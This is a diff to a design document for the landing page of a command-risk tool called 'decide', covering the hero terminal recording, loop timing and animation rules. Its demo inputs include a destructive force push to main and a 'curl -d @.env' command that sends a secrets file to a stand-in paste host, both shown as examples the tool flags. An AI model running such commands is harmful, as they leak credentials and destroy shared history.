@@ -209,8 +209,11 @@ decide v0.3.0          [⌕ Search     ⌘K]               GH │ ▭ Dark ▾
 
 **Hero recording:** `landing.tape`, 69×13 cells.
 
-- **Command:** `echo 'git push --force origin main' | decide run command-risk`.
-  One item and four yes-or-no answers, two of them flagged, read at a glance.
+- **Commands:** three runs of `command-risk`, with the screen cleared between
+  them: `ls -la src` passes all green, `git push --force origin main` is
+  flagged as destructive, and `curl -d @.env paste.example.com` as a leak.
+  Each holds 5 to 6 seconds, so the loop is about 23 seconds. One item and
+  four yes-or-no answers each, read at a glance.
 - **Why not a diff:** a run of `code-risk` on two changed files printed 19
   lines, with score bars, descriptions and an exit line. It was too busy for a
   first screen.
@@ -282,7 +285,7 @@ decide v0.3.0          [⌕ Search     ⌘K]               GH │ ▭ Dark ▾
   a registry of the frames.
 - The frame most in view, if it is at least 50% visible, plays. All the others
   pause.
-- A loop holds its last frame for 3s, written into the tape as `Sleep 3s`.
+- A loop holds each result for about 5s, written into the tape as `Sleep 5s`.
 - With reduced motion, nothing autoplays: the poster shows with "▶ Play".
 
 **Code blocks (Expressive Code):**
@@ -327,7 +330,7 @@ decide v0.3.0          [⌕ Search     ⌘K]               GH │ ▭ Dark ▾
 
 | What | How |
 | --- | --- |
-| Recordings | Play in view, one at a time. Loop with a 3s hold on the last frame. |
+| Recordings | Play in view, one at a time. Loop with a 5s hold on each result. |
 | Meters | CSS `animation-timeline: view()`, `scaleX` from 0, no JavaScript. Without support, or with reduced motion, they show filled. |
 | Hover | Color or border, 120ms. No lift or scale. |
 | Copy | The icon becomes a check for 1.2s. |
